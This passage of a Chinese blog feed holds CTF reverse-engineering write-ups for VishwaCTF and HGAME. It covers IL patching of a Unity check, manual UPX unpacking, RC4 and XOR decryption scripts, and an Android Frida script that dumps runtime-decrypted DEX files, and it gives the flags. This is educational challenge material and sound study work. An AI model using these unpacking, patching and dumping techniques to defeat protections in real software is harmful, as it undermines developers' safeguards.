*)malloc(data_size + 1); // +1 用于字符串结尾    if (!output) &#123;        fprintf(stderr, &quot;Failed to allocate memory\n&quot;);        return 1;    &#125;    // 调用解密函数    decrypt(data, data_size, output);    // 输出解密结果    printf(&quot;Decrypted string: %s\n&quot;, output);    // 释放内存    free(output);    return 0;&#125;</code></pre><p>补个   }</p><p><strong>VishwaCTF{th3r3_4r3_5n4k35_all_4r0und}</strong></p><hr><h3 id="Safe-Box"><a href="#Safe-Box" class="headerlink" title="Safe Box"></a>Safe Box</h3><p>一道unity，题目名字也很形象了，就是一个保险箱，输入正确的密码就能开箱，然后里面就是flag</p><p>dnSpy打开，发现有混淆，但其实可以用de4dot进行去混淆，然后逻辑就很清晰了</p><p>这里就是check，并且还限制了输入密码的次数</p><pre><code class="language-c#">// Token: 0x0600000F RID: 15 RVA: 0x00002654 File Offset: 0x00000854private void method_2()&#123;if (this.int_4 &gt;= 3)&#123;this.d.text = &quot;Too Many Wrong Passwords&quot;;return;&#125;string b = this.method_28(new string[]&#123;&quot;ENTER PASSWORD: &quot;,this.method_17(this.int_0, 1).ToString(),this.method_18(this.int_0, this.int_2).ToString(),this.method_20(this.int_0, this.method_19(this.int_3, 1)).ToString(),this.method_18(this.method_17(this.method_21(this.int_1, 2), this.method_21(this.int_2, 2)), this.method_19(this.int_3, 5)).ToString(),this.method_22(this.int_1, this.method_21(this.int_0, 2)).ToString()&#125;);if (this.d.text == b)&#123;this.float_0 = 1f;I0.J();return;&#125;this.d.color = Color.red;this.d.text = &quot;Wrong&quot;;this.K0();Debug.Log(this.int_4);&#125;</code></pre><p>但是在这里直接改if语句并不能起到很好的效果，但是我们在找Assembly-CSharp.dll的时候看到了Mono.Security.dll，mono的通用套路就是<strong>使用dnspy 分析代码+修改IL指令字节码</strong>，然后我们找到重载的这个类</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250305104332037.png" alt="image-20250305104332037"></p><p>完了进行il语句修改，就修改为和下面这个类一样，不等就好</p><p>把</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250305104415341.png" alt="image-20250305104415341"></p><p>修改为</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/d38cf3518ea2e839eb6d44ef5c30e20d.png" alt="d38cf3518ea2e839eb6d44ef5c30e20d"></p><p>然后保存，运行程序，随便数一个数字就开箱了</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250305104519129.png" alt="image-20250305104519129"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> WritesUp </tag>
            
            <tag> Android </tag>
            
            <tag> Unity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HGAME-RE-WEEK1</title>
      <link href="/2025/03/03/HGAME%20RE/"/>
      <url>/2025/03/03/HGAME%20RE/</url>
      
        <content type="html"><![CDATA[<h1 id="HGAME-RE-WEEK1"><a href="#HGAME-RE-WEEK1" class="headerlink" title="HGAME-RE-WEEK1"></a>HGAME-RE-WEEK1</h1><h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><h3 id="compress-dot-new"><a href="#compress-dot-new" class="headerlink" title="compress_dot_new"></a>compress_dot_new</h3><p>附件中给了一个脚本，丢给ai分析，可知这是一个哈夫曼树的创建，在enc.txt中，给了创建的哈夫曼树，同时给了哈夫曼编码，写个脚本进行解压缩</p><pre><code class="language-python">import jsonclass HuffmanNode:    def __init__(self, left=None, right=None, value=None):        self.left = left  # 左子树 (路径0)        self.right = right  # 右子树 (路径1)        self.value = value  # ASCII码值def build_huffman_tree(json_data):    &quot;&quot;&quot;递归构建霍夫曼树&quot;&quot;&quot;    if &#39;s&#39; in json_data:        return HuffmanNode(value=json_data[&#39;s&#39;])    return HuffmanNode(        left=build_huffman_tree(json_data[&#39;a&#39;]),        right=build_huffman_tree(json_data[&#39;b&#39;])    )def generate_codes(node, prefix=&quot;&quot;, code_map=None):    &quot;&quot;&quot;生成霍夫曼编码表&quot;&quot;&quot;    if code_map is None:        code_map = &#123;&#125;    if node.value is not None:        code_map[node.value] = prefix    else:        generate_codes(node.left, prefix + &quot;0&quot;, code_map)        generate_codes(node.right, prefix + &quot;1&quot;, code_map)    return code_mapdef decode_huffman(bit_str, root):    &quot;&quot;&quot;使用霍夫曼树解码二进制字符串&quot;&quot;&quot;    result = []    current_node = root    for bit in bit_str:        if bit == &#39;0&#39;:            current_node = current_node.left        else:            current_node = current_node.right        if current_node.value is not None:            result.append(current_node.value)            current_node = root  # 重置到根节点    return bytes(result).decode(&#39;latin-1&#39;)# 输入数据json_str = &#39;&#39;&#39;&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:125&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:119&#125;,&quot;b&quot;:&#123;&quot;s&quot;:123&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:104&#125;,&quot;b&quot;:&#123;&quot;s&quot;:105&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:101&#125;,&quot;b&quot;:&#123;&quot;s&quot;:103&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:10&#125;,&quot;b&quot;:&#123;&quot;s&quot;:13&#125;&#125;,&quot;b&quot;:&#123;&quot;s&quot;:32&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:115&#125;,&quot;b&quot;:&#123;&quot;s&quot;:116&#125;&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:46&#125;,&quot;b&quot;:&#123;&quot;s&quot;:48&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:76&#125;,&quot;b&quot;:&#123;&quot;s&quot;:78&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:83&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:68&#125;,&quot;b&quot;:&#123;&quot;s&quot;:69&#125;&#125;&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:44&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:33&#125;,&quot;b&quot;:&#123;&quot;s&quot;:38&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;s&quot;:45&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:100&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:98&#125;,&quot;b&quot;:&#123;&quot;s&quot;:99&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:49&#125;,&quot;b&quot;:&#123;&quot;s&quot;:51&#125;&#125;,&quot;b&quot;:&#123;&quot;s&quot;:97&#125;&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:117&#125;,&quot;b&quot;:&#123;&quot;s&quot;:118&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:112&#125;,&quot;b&quot;:&#123;&quot;s&quot;:113&#125;&#125;,&quot;b&quot;:&#123;&quot;s&quot;:114&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:108&#125;,&quot;b&quot;:&#123;&quot;s&quot;:109&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:110&#125;,&quot;b&quot;:&#123;&quot;s&quot;:111&#125;&#125;&#125;&#125;&#125;&#125;&#39;&#39;&#39;# 构建霍夫曼树data = json.loads(json_str)root = build_huffman_tree(data)# 生成编码表code_table = generate_codes(root)# 查看部分编码示例（ASCII到二进制）print(&quot;霍夫曼编码表示例：&quot;)for char in [125, 119, 123, 104, 105, 101, 103, 10]:    print(f&quot;ASCII &#123;char&#125; (&#123;chr(char) if char &gt; 31 else &#39;控制符&#39;&#125;) -&gt; &#123;code_table[char]&#125;&quot;)# 示例二进制字符串（从 enc.txt 中提取）compressed_bits = &quot;00010001110111111010010000011100010111000100111000110000100010111001110010011011010101111011101100110100011101101001110111110111011011001110110011110011110110111011101101011001111011001111000111001101111000011001100001011011101100011100101001110010111001111000011000101001010000000100101000100010011111110110010111010101000111101000110110001110101011010011111111001111111011010101100001101110101101111110100100111100100010110101111111111100110001010101101110010011111000110110101101111010000011110100000110110101011000111111000110101001011100000110111100000010010100010001011100011100111001011101011111000101010110101111000001100111100011100101110101111100010110101110000010100000010110001111011100011101111110101010010011101011100100011110010010110111101110111010111110110001111010101110010001011100100101110001011010100001110101000101111010100110001110101011101100011011011000011010000001011000111011111111100010101011100000&quot;# 解码二进制字符串decoded_text = decode_huffman(compressed_bits, root)print(&quot;\n解码结果:&quot;, decoded_text)</code></pre><p>hgame{Nu-Shell-scr1pts-ar3-1nt3r3st1ng-t0-wr1te-&amp;-use!}</p><h3 id="Turtle"><a href="#Turtle" class="headerlink" title="Turtle"></a>Turtle</h3><p>查下来有壳，upx壳，并且改了特征值，010修改之后，还是脱不了，我在修改特征值的时候就发现少了UPX!，果然修改好之后工具还是一把梭不了，那就只能手脱，x64dbg直接手脱</p><p>拿到未修复的脱壳exe，大体逻辑就是先输入一个七位的key，然后进行标准的RC4加密，但是密文的加密并没有用加密后的key来加密，还是使用输入时的key，密文的RC4进行了魔改，不是异或，是相减</p><pre><code class="language-c">__int64 sub_401876()&#123;  char sbox1[256]; // [rsp+20h] [rbp-60h] BYREF  char v2[48]; // [rsp+120h] [rbp+A0h] BYREF  char flag[46]; // [rsp+150h] [rbp+D0h] BYREF  char Buf2[5]; // [rsp+17Eh] [rbp+FEh] BYREF  char v5[2]; // [rsp+183h] [rbp+103h] BYREF  char input_key[8]; // [rsp+185h] [rbp+105h] BYREF  char Dest[8]; // [rsp+18Dh] [rbp+10Dh] BYREF  char key1[11]; // [rsp+195h] [rbp+115h] BYREF  int v9; // [rsp+1A0h] [rbp+120h]  int v10; // [rsp+1A4h] [rbp+124h]  int v11; // [rsp+1A8h] [rbp+128h]  int v12; // [rsp+1ACh] [rbp+12Ch]  sub_401C20();  strcpy(key1, &quot;yekyek&quot;);  Buf2[0] = 0xCD;  Buf2[1] = 0x8F;  Buf2[2] = 0x25;  Buf2[3] = 0x3D;  Buf2[4] = 0xE1;  qmemcpy(v5, &quot;QJ&quot;, sizeof(v5));  v2[0] = 0xF8;  v2[1] = 0xD5;  v2[2] = 0x62;  v2[3] = 0xCF;  v2[4] = 0x43;  v2[5] = 0xBA;  v2[6] = 0xC2;  v2[7] = 0x23;  v2[8] = 0x15;  v2[9] = 0x4A;  v2[10] = 0x51;  v2[11] = 0x10;  v2[12] = 0x27;  v2[13] = 0x10;  v2[14] = 0xB1;  v2[15] = 0xCF;  v2[16] = 0xC4;  v2[17] = 9;  v2[18] = 0xFE;  v2[19] = 0xE3;  v2[20] = 0x9F;  v2[21] = 0x49;  v2[22] = 0x87;  v2[23] = 0xEA;  v2[24] = 0x59;  v2[25] = 0xC2;  v2[26] = 7;  v2[27] = 0x3B;  v2[28] = 0xA9;  v2[29] = 0x11;  v2[30] = 0xC1;  v2[31] = 0xBC;  v2[32] = 0xFD;  v2[33] = 0x4B;  v2[34] = 0x57;  v2[35] = 0xC4;  v2[36] = 0x7E;  v2[37] = 0xD0;  v2[38] = 0xAA;  v2[39] = 0xA;  v12 = 6;  v11 = 7;  v10 = 40;  j_printf(&quot;plz input the key: &quot;);  j_scanf(&quot;%s&quot;, input_key);  j__mbscpy(Dest, input_key);  v9 = 7;  init(key1, v12, sbox1);  RC4(input_key, v9, sbox1);  if ( !j_memcmp(input_key, Buf2, v11) )  &#123;    j_printf(&quot;plz input the flag: &quot;);    j_scanf(&quot;%s&quot;, flag);    *&amp;key1[7] = 40;    init(Dest, v9, sbox1);    sub_40175A(flag, *&amp;key1[7], sbox1);    if ( !j_memcmp(flag, v2, v10) )      j_puts(Buffer);    else      j_puts(aWrongPlzTryAga);  &#125;  else  &#123;    j_puts(aKeyIsWrong);  &#125;  return 0i64;&#125;</code></pre><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250203212214952.png" alt="image-20250203212214952"></p><p>直接脚本解密</p><pre><code class="language-c">#include&lt;stdio.h&gt; #include&lt;stdlib.h&gt;#include&lt;string.h&gt; int init(unsigned char* s, unsigned char* key, unsigned long Len_k)&#123;    int i = 0, j = 0;char k[256] = &#123; 0 &#125;;unsigned char tmp = 0;for (i = 0; i &lt; 256; i++) &#123;s[i] = i;k[i] = key[i % Len_k];&#125;for (i = 0; i &lt; 256; i++) &#123;j = (j + s[i] + k[i]) % 256;tmp = s[i];s[i] = s[j];s[j] = tmp;&#125;return 0; &#125;int rc4(unsigned char* Data, unsigned long Len_D, unsigned char* key, unsigned long Len_k) &#123;unsigned char s[256];init(s, key, Len_k);int i = 0, j = 0, t = 0;unsigned long k = 0;unsigned char tmp;for (k = 0; k &lt; Len_D; k++) &#123;i = (i + 1) % 256;j = (j + s[i]) % 256;tmp = s[i];s[i] = s[j];s[j] = tmp;t = (s[i] + s[j]) % 256;Data[k] = Data[k] ^ s[t];&#125;return 0; &#125;int main()&#123;unsigned char key[] = &quot;yekyek&quot;;                                 //密钥生成的过程printf(&quot;%s\n&quot;,key);unsigned long key_len = sizeof(key) - 1;unsigned char qw[] = &#123;0xcd, 0x8f, 0x25, 0x3d, 0xe1, 0x51, 0x4a&#125;;//密文rc4(qw, sizeof(qw), key, key_len);for (int i = 0; i &lt; sizeof(qw); i++)&#123; printf(&quot;%c&quot;,qw[i]);  &#125;return 0;&#125;</code></pre><p>拿到key</p><p><strong>ecg4ab6</strong></p><pre><code class="language-c">#include&lt;stdio.h&gt; #include&lt;stdlib.h&gt;#include&lt;string.h&gt; int init(unsigned char* s, unsigned char* key, unsigned long Len_k)&#123;    int i = 0, j = 0;char k[256] = &#123; 0 &#125;;unsigned char tmp = 0;for (i = 0; i &lt; 256; i++) &#123;s[i] = i;k[i] = key[i % Len_k];&#125;for (i = 0; i &lt; 256; i++) &#123;j = (j + s[i] + k[i]) % 256;tmp = s[i];s[i] = s[j];s[j] = tmp;&#125;return 0; &#125;int rc4(unsigned char* Data, unsigned long Len_D, unsigned char* key, unsigned long Len_k) &#123;unsigned char s[256];init(s, key, Len_k);int i = 0, j = 0, t = 0;unsigned long k = 0;unsigned char tmp;for (k = 0; k &lt; Len_D; k++) &#123;i = (i + 1) % 256;j = (j + s[i]) % 256;tmp = s[i];s[i] = s[j];s[j] = tmp;t = (s[i] + s[j]) % 256;Data[k] = Data[k] + s[t];&#125;return 0; &#125;int main()&#123;unsigned char key[] = &quot;ecg4ab6&quot;;                                 //密钥生成的过程printf(&quot;%s\n&quot;,key);unsigned long key_len = sizeof(key) - 1;unsigned char qw[40];    qw[0] = 0xF8;  qw[1] = 0xD5;  qw[2] = 0x62;  qw[3] = 0xCF;  qw[4] = 0x43;  qw[5] = 0xBA;  qw[6] = 0xC2;  qw[7] = 0x23;  qw[8] = 0x15;  qw[9] = 0x4A;  qw[10] = 0x51;  qw[11] = 0x10;  qw[12] = 0x27;  qw[13] = 0x10;  qw[14] = 0xB1;  qw[15] = 0xCF;  qw[16] = 0xC4;  qw[17] = 9;  qw[18] = 0xFE;  qw[19] = 0xE3;  qw[20] = 0x9F;  qw[21] = 0x49;  qw[22] = 0x87;  qw[23] = 0xEA;  qw[24] = 0x59;  qw[25] = 0xC2;  qw[26] = 7;  qw[27] = 0x3B;  qw[28] = 0xA9;  qw[29] = 0x11;  qw[30] = 0xC1;  qw[31] = 0xBC;  qw[32] = 0xFD;  qw[33] = 0x4B;  qw[34] = 0x57;  qw[35] = 0xC4;  qw[36] = 0x7E;  qw[37] = 0xD0;  qw[38] = 0xAA;  qw[39] = 0xA;//密文rc4(qw, sizeof(qw), key, key_len);for (int i = 0; i &lt; sizeof(qw); i++)&#123; printf(&quot;%c&quot;,qw[i]);  &#125;return 0;&#125;</code></pre><p>拿到flag</p><p>hgame{Y0u’r3_re4l1y_g3t_0Ut_of_th3_upX!}</p><h3 id="Delta-erro0000ors"><a href="#Delta-erro0000ors" class="headerlink" title="Delta_erro0000ors"></a>Delta_erro0000ors</h3><p>这题的考点是异常检测，ida一分析，看到汇编就不难发现</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250205152314798.png" alt="image-20250205152314798"></p><p>那么我们可以找到异常跳转的地方，下好断点，避免待会下断点调试时程序跑飞</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250205152454960.png" alt="image-20250205152454960"></p><p>然后构造假flag进行输入动调</p><p>输入flag后，F9运行，会弹出</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250205152552734.png" alt="image-20250205152552734"></p><p>点击ok</p><p>再继续F9运行，其实F8步过也可以，会弹出</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250205152721361.png" alt="image-20250205152721361"></p><p>第一次捕获异常，点No，然后后面点Yes，就可以成功跳转到except</p><p>此时程序要求我们输入一个32位的md5，一样，随意输入32位的字符串</p><p>但在这里，我们分析汇编可知，输入的字符串，经过处理之后会存储到<strong>rdi</strong>里，我们双击<strong>rdi</strong>，然后F2下硬件断点，因为经过尝试，发现不下硬件断点好像断不下来，在下一次异常跳转的时候，程序会直接跑飞</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250205153018534.png" alt="image-20250205153018534"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250205153107399.png" alt="image-20250205153107399"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250205153041819.png" alt="image-20250205153041819"></p><p>然后多次F9运行</p><p>发现这里有一个比较</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250205153203042.png" alt="image-20250205153203042"></p><p>寄存器<strong>rcx</strong>的值就是与我们输入的md5的值进行比较的硬编码，提取出来，重新动调并输入</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250205153309857.png" alt="image-20250205153309857"></p><p>然后重复上面的操作，F9运行，最终断下来</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250205154608285.png" alt="image-20250205154608285"></p><p>然后可以提取到异或的key值</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250205154706200.png" alt="image-20250205154706200"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250205154726756.png" alt="image-20250205154726756"></p><p>就可以写脚本解密了</p><p>本题的整体逻辑就是，先输入flag并且检查格式，然后再要求输入一个md5值与程序内设定的一个值进行比较，如果正确才会对flag进行异或加密</p><pre><code class="language-python">enc = [0x3B, 0x02, 0x17, 0x08, 0x0B, 0x5B, 0x4A, 0x52, 0x4D, 0x11,       0x11, 0x4B, 0x5C, 0x43, 0x0A, 0x13, 0x54, 0x12, 0x46, 0x44,       0x53, 0x59, 0x41, 0x11, 0x0C, 0x18, 0x17, 0x37, 0x30, 0x48,       0x15, 0x07, 0x5A, 0x46, 0x15, 0x54, 0x1B, 0x10, 0x43, 0x40,       0x5F, 0x45, 0x5A]key = [0x53, 0x65, 0x76, 0x65, 0x6E, 0x20, 0x73, 0x61, 0x79,       0x73, 0x20, 0x79, 0x6F, 0x75, 0x27, 0x72, 0x65, 0x20, 0x72,       0x69, 0x67, 0x68, 0x74, 0x21, 0x21, 0x21, 0x21, 0]for i in range(len(enc)):    print(chr(enc[i] ^ key[i % len(key)]), end=&quot;&quot;)</code></pre><p>hgame{934b1236-a124-4150-967c-cb4ff5bcc900}</p><h3 id="zundujiadu"><a href="#zundujiadu" class="headerlink" title="zundujiadu"></a>zundujiadu</h3><p>安卓题，分析Java层</p><p>MainActivity</p><pre><code class="language-java">package com.nobody.zunjia;import android.os.Bundle;import androidx.appcompat.app.AppCompatActivity;import androidx.navigation.NavController;import androidx.navigation.Navigation;import androidx.navigation.ui.AppBarConfiguration;import androidx.navigation.ui.NavigationUI;import com.nobody.zunjia.databinding.ActivityMainBinding;/* loaded from: classes3.dex */public class MainActivity extends AppCompatActivity &#123;    private AppBarConfiguration appBarConfiguration;    private ActivityMainBinding binding;    /* JADX INFO: Access modifiers changed from: protected */    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity    public void onCreate(Bundle savedInstanceState) &#123;        super.onCreate(savedInstanceState);        this.binding = ActivityMainBinding.inflate(getLayoutInflater());        setContentView(this.binding.getRoot());        setSupportActionBar(this.binding.toolbar);        NavController navController = Navigation.findNavController(this, R.id.nav_host_fragment_content_main);        this.appBarConfiguration = new AppBarConfiguration.Builder(navController.getGraph()).build();        NavigationUI.setupActionBarWithNavController(this, navController, this.appBarConfiguration);    &#125;    @Override // androidx.appcompat.app.AppCompatActivity    public boolean onSupportNavigateUp() &#123;        NavController navController = Navigation.findNavController(this, R.id.nav_host_fragment_content_main);        return NavigationUI.navigateUp(navController, this.appBarConfiguration) || super.onSupportNavigateUp();    &#125;&#125;</code></pre><p>jiadu</p><pre><code class="language-java">package com.nobody.zunjia;import android.os.Bundle;import android.view.LayoutInflater;import android.view.View;import android.view.ViewGroup;import android.widget.ImageView;import androidx.fragment.app.Fragment;import androidx.navigation.fragment.NavHostFragment;import com.nobody.zunjia.databinding.FragmentSecondBinding;/* loaded from: classes3.dex */public class jiadu extends Fragment &#123;    private FragmentSecondBinding binding;    @Override // androidx.fragment.app.Fragment    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) &#123;        this.binding = FragmentSecondBinding.inflate(inflater, container, false);        return this.binding.getRoot();    &#125;    @Override // androidx.fragment.app.Fragment    public void onViewCreated(View view, Bundle savedInstanceState) &#123;        super.onViewCreated(view, savedInstanceState);        ImageView JiaDu = this.binding.jiaduimage;        final Bundle bundle = getArguments();        JiaDu.setOnClickListener(new View.OnClickListener() &#123; // from class: com.nobody.zunjia.jiadu.1            @Override // android.view.View.OnClickListener            public void onClick(View v) &#123;                String ZunduJiadu;                String ZunduJiadu2 = bundle.getString(&quot;zunjia&quot;);                if (ZunduJiadu2 == null) &#123;                    ZunduJiadu = &quot;o.0&quot;;                &#125; else if (ZunduJiadu2.length() &lt; 36) &#123;                    ZunduJiadu = ZunduJiadu2 + &quot;o.0&quot;;                &#125; else &#123;                    ZunduJiadu = &quot;The length is too large&quot;;                &#125;                bundle.putString(&quot;zunjia&quot;, ZunduJiadu);                toast to = new toast(jiadu.this.getContext());                to.setText(ZunduJiadu);                to.setDuration(0);                to.show();            &#125;        &#125;);        this.binding.buttonSecond.setOnClickListener(new View.OnClickListener() &#123; // from class: com.nobody.zunjia.jiadu$$ExternalSyntheticLambda0            @Override // android.view.View.OnClickListener            public final void onClick(View view2) &#123;                jiadu.this.m214lambda$onViewCreated$0$comnobodyzunjiajiadu(bundle, view2);            &#125;        &#125;);    &#125;    /* JADX INFO: Access modifiers changed from: package-private */    /* renamed from: lambda$onViewCreated$0$com-nobody-zunjia-jiadu, reason: not valid java name */    public /* synthetic */ void m214lambda$onViewCreated$0$comnobodyzunjiajiadu(Bundle bundle, View v) &#123;        NavHostFragment.findNavController(this).navigate(R.id.action_SecondFragment_to_FirstFragment, bundle);    &#125;    @Override // androidx.fragment.app.Fragment    public void onDestroyView() &#123;        super.onDestroyView();        this.binding = null;    &#125;&#125;</code></pre><p>toast</p><pre><code class="language-Java">package com.nobody.zunjia;import android.content.Context;import android.widget.Toast;/* loaded from: classes3.dex */public class toast extends Toast &#123;    private Context mycontext;    static native void check(Context context, String str);    public toast(Context context) &#123;        super(context);        this.mycontext = context;    &#125;    @Override // android.widget.Toast    public void setText(CharSequence s) &#123;        super.setText(s);        check(this.mycontext, (String) DexCall.callDexMethod(this.mycontext, this.mycontext.getString(R.string.dex), this.mycontext.getString(R.string.classname), this.mycontext.getString(R.string.func1), s));    &#125;&#125;</code></pre><p>其他的就不贴出来了</p><p>整体逻辑就是运行app，然后通过0.o和o.0的不同组合，总长度为36，然后动态调用一个dex，对该字符串进行处理，接着将加密结果作为key传到so层进行标准的RC4加密</p><p>接下来就是dump下运行时的dex，因为动态调用这个dex时，是通过so层的逻辑来进行解密assets文件夹里的dex文件，是个对称加密，在使用完该dex文件后，就会在内存中将其删除。于是乎暴力点，写个Frida hook脚本，将运行时所调用的dex文件全部dump下来，下面是脚本</p><pre><code class="language-js">function get_self_process_name() &#123;    var openPtr = Module.getExportByName(&#39;libc.so&#39;, &#39;open&#39;);    var open = new NativeFunction(openPtr, &#39;int&#39;, [&#39;pointer&#39;, &#39;int&#39;]);    var readPtr = Module.getExportByName(&quot;libc.so&quot;, &quot;read&quot;);    var read = new NativeFunction(readPtr, &quot;int&quot;, [&quot;int&quot;, &quot;pointer&quot;, &quot;int&quot;]);    var closePtr = Module.getExportByName(&#39;libc.so&#39;, &#39;close&#39;);    var close = new NativeFunction(closePtr, &#39;int&#39;, [&#39;int&#39;]);    var path = Memory.allocUtf8String(&quot;/proc/self/cmdline&quot;);    var fd = open(path, 0);    if (fd != -1) &#123;        var buffer = Memory.alloc(0x1000);        var result = read(fd, buffer, 0x1000);        close(fd);        result = ptr(buffer).readCString();        return result;    &#125;    return &quot;-1&quot;;&#125;function mkdir(path) &#123;    var mkdirPtr = Module.getExportByName(&#39;libc.so&#39;, &#39;mkdir&#39;);    var mkdir = new NativeFunction(mkdirPtr, &#39;int&#39;, [&#39;pointer&#39;, &#39;int&#39;]);    var opendirPtr = Module.getExportByName(&#39;libc.so&#39;, &#39;opendir&#39;);    var opendir = new NativeFunction(opendirPtr, &#39;pointer&#39;, [&#39;pointer&#39;]);    var closedirPtr = Module.getExportByName(&#39;libc.so&#39;, &#39;closedir&#39;);    var closedir = new NativeFunction(closedirPtr, &#39;int&#39;, [&#39;pointer&#39;]);    var cPath = Memory.allocUtf8String(path);    var dir = opendir(cPath);    if (dir != 0) &#123;        closedir(dir);        return 0;    &#125;    mkdir(cPath, 755);    chmod(path);&#125;function chmod(path) &#123;    var chmodPtr = Module.getExportByName(&#39;libc.so&#39;, &#39;chmod&#39;);    var chmod = new NativeFunction(chmodPtr, &#39;int&#39;, [&#39;pointer&#39;, &#39;int&#39;]);    var cPath = Memory.allocUtf8String(path);    chmod(cPath, 755);&#125;function dump_dex() &#123;    var libart = Process.findModuleByName(&quot;libart.so&quot;);    var addr_DefineClass = null;    var symbols = libart.enumerateSymbols();    for (var index = 0; index &lt; symbols.length; index++) &#123;        var symbol = symbols[index];        var symbol_name = symbol.name;        //这个DefineClass的函数签名是Android9的        //_ZN3art11ClassLinker11DefineClassEPNS_6ThreadEPKcmNS_6HandleINS_6mirror11ClassLoaderEEERKNS_7DexFileERKNS9_8ClassDefE        if (symbol_name.indexOf(&quot;ClassLinker&quot;) &gt;= 0 &amp;&amp;            symbol_name.indexOf(&quot;DefineClass&quot;) &gt;= 0 &amp;&amp;            symbol_name.indexOf(&quot;Thread&quot;) &gt;= 0 &amp;&amp;            symbol_name.indexOf(&quot;DexFile&quot;) &gt;= 0) &#123;            console.log(symbol_name, symbol.address);            addr_DefineClass = symbol.address;        &#125;    &#125;    var dex_maps = &#123;&#125;;    var dex_count = 1;    console.log(&quot;[DefineClass:]&quot;, addr_DefineClass);    if (addr_DefineClass) &#123;        Interceptor.attach(addr_DefineClass, &#123;            onEnter: function(args) &#123;                var dex_file = args[5];                //ptr(dex_file).add(Process.pointerSize) is &quot;const uint8_t* const begin_;&quot;                //ptr(dex_file).add(Process.pointerSize + Process.pointerSize) is &quot;const size_t size_;&quot;                var base = ptr(dex_file).add(Process.pointerSize).readPointer();                var size = ptr(dex_file).add(Process.pointerSize + Process.pointerSize).readUInt();                if (dex_maps[base] == undefined) &#123;                    dex_maps[base] = size;                    var magic = ptr(base).readCString();                    if (magic.indexOf(&quot;dex&quot;) == 0) &#123;                        var process_name = get_self_process_name();                        if (process_name != &quot;-1&quot;) &#123;                            var dex_dir_path = &quot;/data/data/&quot; + process_name + &quot;/files/dump_dex_&quot; + process_name;                            mkdir(dex_dir_path);                            var dex_path = dex_dir_path + &quot;/class&quot; + (dex_count == 1 ? &quot;&quot; : dex_count) + &quot;.dex&quot;;                            console.log(&quot;[find dex]:&quot;, dex_path);                            var fd = new File(dex_path, &quot;wb&quot;);                            if (fd &amp;&amp; fd != null) &#123;                                dex_count++;                                var dex_buffer = ptr(base).readByteArray(size);                                fd.write(dex_buffer);                                fd.flush();                                fd.close();                                console.log(&quot;[dump dex]:&quot;, dex_path);                            &#125;                        &#125;                    &#125;                &#125;            &#125;,            onLeave: function(retval) &#123;&#125;        &#125;);    &#125;&#125;var is_hook_libart = false;function hook_dlopen() &#123;    Interceptor.attach(Module.findExportByName(null, &quot;dlopen&quot;), &#123;        onEnter: function(args) &#123;            var pathptr = args[0];            if (pathptr 